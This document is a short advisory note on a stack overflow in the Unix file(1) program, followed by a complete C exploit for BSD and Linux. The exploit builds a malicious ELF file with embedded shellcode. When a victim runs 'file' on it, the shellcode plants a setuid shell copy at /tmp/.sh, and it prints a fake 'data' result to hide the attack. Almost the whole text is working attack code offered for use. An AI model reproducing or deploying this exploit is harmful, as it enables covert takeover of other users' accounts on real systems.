source: http://www.securityfocus.com/bid/7008/info
 
It has been reported that a stack overflow exists in the file program. Although details of this issue are currently unavailable, it is likely that this issue could be exploited to execute code as the user invoking file. 

/*
** file(1) exploit for *bsd,linux
** does cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh and also
** echos the correct filename followed by ": data"
** this one actually works w/o silly targets or offsets
** cmdshellcode by *://lsd-pl.net/
** lem0nxx@hotmail.com
*/
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <errno.h>
/* elf stuff */
#define EI_NIDENT       16
#define ET_EXEC         2
#define EM_VPP500       17/* Fujitsu VPP500! */
#define EV_CURRENT      1
#define FILESIZE 16384
typedef unsigned short int Elf32_Half;
typedef unsigned long int Elf32_Word;
typedef unsigned long int Elf32_Addr;
typedef unsigned long int Elf32_Off;
typedef struct
{
  unsigned char e_ident[EI_NIDENT];
  Elf32_Half e_type;
  Elf32_Half e_machine;
  Elf32_Word e_version;
  Elf32_Addr e_entry;
  Elf32_Off e_phoff;
  Elf32_Off e_shoff;
  Elf32_Word e_flags;
  Elf32_Half e_ehsize;
  Elf32_Half e_phentsize;
  Elf32_Half e_phnum;
  Elf32_Half e_shentsize;
  Elf32_Half e_shnum;
  Elf32_Half e_shtrndx;
}
Elf32_Ehdr;
unsigned long
get_sp (void)
{
  __asm__ ("movl %esp,%eax");
}
unsigned char linux_code[] =
  "\xeb\x22\x59\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
  "\xe3\x50\x66\x68\x2d\x63\x89\xe7\x50\x51\x57\x53\x89\xe1\x99\xb0\x0b"
  "\xcd\x80\xe8\xd9\xff\xff\xff";
unsigned char bsd_code[] =
  "\xeb\x25\x59\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
  "\xe3\x50\x66\x68\x2d\x63\x89\xe7\x50\x51\x57\x53\x89\xe7\x50\x57\x53"
  "\x50\xb0\x3b\xcd\x80\xe8\xd6\xff\xff\xff";
unsigned char cmd[] =
  "echo %s: data;/bin/cp /bin/%s /tmp/.sh;chmod 4755 /tmp/.sh";
unsigned char *prepare_code (unsigned char *os_code, unsigned char *filename,
     unsigned char *shell, int *code_len);
int
main (int argc, char *argv[])
{
  unsigned char *final_code, *os_code, *shell, *attackbuff;
  int fd, ix, code_len;
  Elf32_Ehdr *ehdr;
  if (!(attackbuff = (char *) malloc (FILESIZE)))
    {
      fprintf (stderr, "malloc error\n");
      exit (-1);
    }
  ehdr = (Elf32_Ehdr *) attackbuff;
  if (argc < 3)
    {
      fprintf (stderr, "Usage: %s <filename> <bsd|linux>\n", argv[0]);
      exit (-1);
    }
  switch (argv[2][0])
    {
    case 'l':
    case 'L':
      os_code = linux_code;
      if (!(shell = strdup ("ash")))
{
  fprintf (stderr, "strdup error\n");
  exit (-1);
}
      break;
    case 'b':
    case 'B':
      os_code = bsd_code;
      if (!(shell = strdup ("tcsh")))/* does tcsh drop privs tho? ah well */
{
  fprintf (stderr, "strdup error\n");
  exit (-1);
}
      break;
    default:
      fprintf (stderr, "Invalid target os\n");
      exit (-1);
    }
  fprintf (stderr,
   "elfrape2, using cp /bin/%s /tmp/.sh;chmod 4755 /tmp/.sh shellcode\n",
   shell);
  final_code = prepare_code (os_code, argv[1], shell, &code_len);
  fprintf (stderr, "Using %s shellcode, %d bytes for file %s\n",
   argv[2][0] == 'b' ? "BSD" : "LINUX", code_len, argv[1]);
  memset (attackbuff, 0x90, FILESIZE);
  memset (attackbuff, 0x0, sizeof (Elf32_Ehdr));
  memcpy (attackbuff + FILESIZE - code_len, final_code, code_len);
  /* file requires the following shit */
  ehdr->e_ident[0] = 0x7f; /* elf magic shit */
  ehdr->e_ident[1] = 'E';
  ehdr->e_ident[2] = 'L';
  ehdr->e_ident[3] = 'F';
  ehdr->e_ident[4] = 0x01;/* 32 bit objects */
  ehdr->e_ident[5] = 0x01;/* LSB */
  ehdr->e_type = ET_EXEC;/* if you wanna know, go google it */
  ehdr->e_machine = EM_VPP500;
  ehdr->e_version = EV_CURRENT;
  ehdr->e_shoff = sizeof (Elf32_Ehdr);
  ehdr->e_ehsize = sizeof (Elf32_Ehdr);
  ehdr->e_shentsize = 2048;
  ehdr->e_shnum = 0x0001;
  for (ix = 0; ix < 256; ix += 4)
    {
      *(long *) (attackbuff + ehdr->e_ehsize + ix) = get_sp () - 1500;
    }
  if ((fd = open (argv[1], O_WRONLY | O_CREAT | O_TRUNC)) < 0)
    {
      perror ("open()");
      exit (-1);
    }
  if (write (fd, attackbuff, FILESIZE) == -1)
    {
      perror ("write()");
      exit (-1);
    }
  close (fd);
  free (shell);
  free (final_code);
  fprintf (stderr,
   "Use /tmp/.sh to gain the targets uid once they run 'file %s'\n",
   argv[1]);
  fprintf (stderr, "Make sure the shell you copied doesn't drop privs\n");
  return 0;
}
/* this func allows for the shellcode to echo out legit results for file */
unsigned char *
prepare_code (unsigned char *os_code, unsigned char *filename,
      unsigned char *shell, int *len)
{
  unsigned char *complete;
  *len = strlen (os_code);
  *len += strlen (cmd);
  *len += strlen (filename) - 2;
  *len += strlen (shell) - 2;
  if (!(complete = (char *) malloc (*len)))
    {
      fprintf (stderr, "malloc error\n");
      exit (-1);
    }
  memcpy (complete, os_code, strlen (os_code));
  sprintf (complete + strlen (os_code), cmd, filename, shell, shell, shell,
   shell);
  return complete;
}